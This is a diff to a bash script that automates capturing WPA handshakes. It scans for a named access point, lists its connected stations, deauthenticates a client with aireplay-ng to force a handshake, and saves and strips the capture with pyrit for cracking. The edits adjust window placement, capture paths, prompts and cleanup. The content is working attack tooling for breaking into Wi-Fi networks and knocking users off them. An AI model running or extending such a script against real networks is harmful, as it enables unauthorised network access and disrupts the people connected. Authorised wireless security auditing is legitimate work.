@@ -17,7 +17,7 @@
 fapscan()
 {
 	clear
-	gnome-terminal --geometry=130x20 -x airodump-ng mon0 -a -w $HOME/tmp -o csv&
+	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 -a -w $HOME/tmp -o csv&
 	$COLOR 2;echo "[*] Scanning for AP's with names like $PARTIALESSID [*]";$COLOR 9
 	while [ $DONE -z ] 2> /dev/null
 		do
@@ -52,14 +52,13 @@ fclientscan()
 		$COLOR 2;echo " [*] $ESSID Found! BSSID:$BSSID CHANNEL:$CHAN [*]"
 		echo
 		$COLOR 4;echo ' [*] Please wait while I gather active stations.. [*]';$COLOR 9
-		gnome-terminal --geometry=130x20 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w $HOME/tmp1&
+		gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w $HOME/tmp1&
 		DONE=""
 		while [ $DONE -z ] 2> /dev/null
 			do
 				sleep 2
 				DONE=$(cat $HOME/tmp1-01.csv 2> /dev/null | grep 'Station' -A 10 | grep $BSSID)
 			done
-		killall airodump-ng
 		DONE=$(cat $HOME/tmp1-01.csv 2> /dev/null | grep 'Station' -A 10)
 		echo "$DONE" > $HOME/tmp
 		while read LINE
@@ -101,8 +100,6 @@ fcap()
 		do
 			CHAN="${CHAN:1}"
 	done
-	sleep 0.5
-	gnome-terminal --geometry=130x20 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w "$HOME"/Desktop/cap/handshakes/$FILENAME -o pcap&
 	clear
 	echo
 	DONE=""
@@ -113,8 +110,12 @@ fcap()
 			echo
 			$COLOR 1;aireplay-ng -0 2 -a $BSSID -c $CLIE mon0;$COLOR 9
 			sleep 3
+			clear
+			echo "   [ WPA handshake: $BSSID"
 			echo
-			$COLOR 4;read -p " [>] was the hanshake successfully captured? [Y/n]: " WASCAP;$COLOR 9
+			$COLOR 2;echo " [^] You should see this in the airodump-ng window [^]";$COLOR 9
+			$COLOR 4;echo " [>] was the hanshake successfully captured? [Y/n]: ";$COLOR 9
+			read -p "  >" WASCAP
 				case $WASCAP in
 					"Y")DONE="1";;
 					"y")DONE="1";;
@@ -126,8 +127,8 @@ fcap()
 	echo
 	$COLOR 4;echo "[*] Saving and Stripping capture, please wait... [*]"
 	echo
-	pyrit -r $HOME/Desktop/cap/handshakes/"$FILENAME"-01.cap -o $HOME/Desktop/cap/handshakes/$FILENAME2 strip;$COLOR 9
-	rm $HOME/Desktop/cap/handshakes/"$FILENAME"-01.cap
+	pyrit -r $HOME/tmp1-01.cap -o $HOME/Desktop/cap/handshakes/$FILENAME2 strip;$COLOR 9
+	rm $HOME/tmp1-01.cap
 	airmon-ng stop mon0&
 	rm -rf $HOME/tmp*
 	ISGOOD=$(pyrit -r $HOME/Desktop/cap/handshakes/$FILENAME2 analyze | grep good)
@@ -186,7 +187,7 @@ fexit()
 {
 			tput setab 9
 			killall aircrack-ng 2> /dev/null
-			rm -rf $HOME/tmp* 2> /dev/null
+			#rm -rf $HOME/tmp* 2> /dev/null
 			MOND=$(ifconfig | grep mon0)
 			if [ $MOND -z ] 2> /dev/null
 				then
